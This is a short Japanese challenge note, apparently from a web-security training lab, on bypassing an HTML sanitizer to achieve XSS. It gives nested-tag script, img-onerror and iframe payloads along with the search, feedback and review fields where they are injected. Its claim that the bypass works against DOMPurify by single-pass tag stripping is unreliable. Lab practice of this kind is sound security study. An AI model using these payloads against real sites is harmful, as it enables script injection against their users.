# Sanitization Bypass ❌

**難易度:** ⭐⭐⭐⭐
**カテゴリ:** XSS
**目標:** DOMPurify のサニタイズをバイパスしてXSSを実行

## ヒント

- **ライブラリ:** DOMPurify が使用されている
- **脆弱性:** 二重タグでサニタイズをバイパス
- **原理:** 最初のパスでタグを除去 → 残った部分が有効なタグになる

## 攻撃ペイロード

```html
<!-- 基本形 -->
<<script>script>alert('xss')<</script>/script>

<!-- 解説 -->
<<script>script>  → 最初の<script>が除去 → <script>が残る
<</script>/script> → 最初の</script>が除去 → </script>が残る

<!-- 結果 -->
<script>alert('xss')</script>
```

## 他のバイパス手法

```html
<!-- img タグ -->
<<img>img src=x onerror=alert(1)>

<!-- iframe -->
<<iframe>iframe src="javascript:alert(1)">
```

## 適用場所

- 検索クエリ: `/#/search?q=`
- フィードバックコメント
- 商品レビュー

## 検証ポイント

- [ ] 通常のXSSペイロードがサニタイズされることを確認
- [ ] 二重タグでバイパス成功
- [ ] alert が実行されることを確認

## 解説

[未着手]
